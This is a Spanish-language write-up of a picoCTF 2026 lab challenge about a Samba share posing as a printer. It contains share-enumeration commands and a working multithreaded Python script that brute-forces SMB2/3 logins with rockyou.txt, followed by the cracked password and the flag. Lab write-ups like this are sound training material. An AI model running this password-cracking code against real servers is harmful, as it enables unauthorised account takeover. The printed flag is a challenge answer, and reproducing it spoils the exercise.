# General Skills — Printer Shares 2

## Descripción
> **Prompt oficial del reto:** "A Secure Printer is now in use. I'm confident no one can leak the message again... or can you? two printers are on **61716**, one private, one public. you can try `$ nc -vz green-hill.picoctf.net 61716`."
>
> **Hints:**
> 1. default password is dangerous, isn't it?
> 2. can you find a potential user? What is the username?
> 3. the wordlist, rockyou.txt, is pretty common for password cracking

- **Categoría:** General Skills
- **Dificultad:** Hard
- **Evento/origen:** picoCTF 2026
- **Autor:** Janice He

## Solución
Un `nmap -sV` al puerto 61716 identifica el servicio real detrás del "printer": **Samba smbd 4** (SMB/CIFS), no un protocolo de impresión. Enumerando los shares sin autenticación:

```bash
smbclient -L //green-hill.picoctf.net -p 61716 -N
# shares          Disk      Public Share With Guests
# secure-shares   Disk      Printer for internal usage only
```

El share público `shares` permite acceso anónimo y contiene 3 archivos de texto (dos pangramas/textos de relleno sin relevancia, y uno con la pista real):

```
notification.txt:
Hi Joe,
We've identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.
If you have never logged into the printer before, please note that the default password is currently in use.
Best, The Operator Team
```

Esto responde los hints 1 y 2 directamente: el **usuario** es `Joe` (dirigido explícitamente en el mensaje) y su contraseña sigue siendo la **contraseña por defecto** — es decir, hay que averiguarla por fuerza bruta contra el propio servicio SMB (hint 3: `rockyou.txt`).

`hydra` con su módulo `smb` no sirve aquí porque solo soporta SMBv1, y el servidor lo tiene deshabilitado (`SMB1 disabled`). Se resolvió con un script en Python usando la librería `smbprotocol` (soporta SMB2/3 + NTLM), abriendo una conexión nueva por intento para poder paralelizar con hilos sin compartir estado entre ellos:

```python
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.exceptions import LogonFailure

def try_login(password):
    conn = Connection(uuid.uuid4(), "green-hill.picoctf.net", 61716)
    conn.connect(timeout=5)
    try:
        Session(conn, "joe", password, require_encryption=False).connect()
        return (password, True)
    except LogonFailure:
        return (password, False)
    finally:
        conn.disconnect()

with open("rockyou.txt", encoding="latin-1") as f:
    passwords = [l.strip() for l in f][:100000]

with ThreadPoolExecutor(max_workers=24) as ex:
    for fut in as_completed({ex.submit(try_login, pw): pw for pw in passwords}):
        pw, ok = fut.result()
        if ok:
            print("FOUND:", pw)
            break
```

La contraseña correcta (`popcorn`) apareció dentro de los primeros ~100,000 renglones de `rockyou.txt`. Con `joe:popcorn` se accede al share privado `secure-shares`, que contiene la flag directamente:

```bash
smbclient //green-hill.picoctf.net/secure-shares -p 61716 -U "joe%popcorn" -c "get flag.txt"
cat flag.txt
# picoCTF{5mb_pr1nter_5h4re5_5ecure_5e30b668}
```

## Notas adicionales
- `nmap -sV` es clave para no dar por sentado que un puerto "de impresora" habla realmente IPP/JetDirect — aquí resultó ser SMB corriendo en un puerto no estándar.
- **Herramienta correcta según versión de protocolo:** el módulo `smb` de `hydra` solo implementa SMBv1; contra un servidor moderno con SMB1 deshabilitado hay que usar una librería que hable SMB2/3+NTLM (`smbprotocol` en Python, o `crackmapexec`/`netexec` si están disponibles) — de lo contrario el ataque falla silenciosamente con "does not support SMBv1" sin ni siquiera intentar una contraseña.
- Para paralelizar autenticación SMB con hilos, cada intento necesita su **propia conexión/sesión** (`Connection(uuid.uuid4(), ...)`) — reusar un cliente de alto nivel tipo `smbclient.register_session` entre hilos genera condiciones de carrera sobre el estado global del módulo.

## Referencias
- Reto: https://learn.cylabacademy.org/library/734
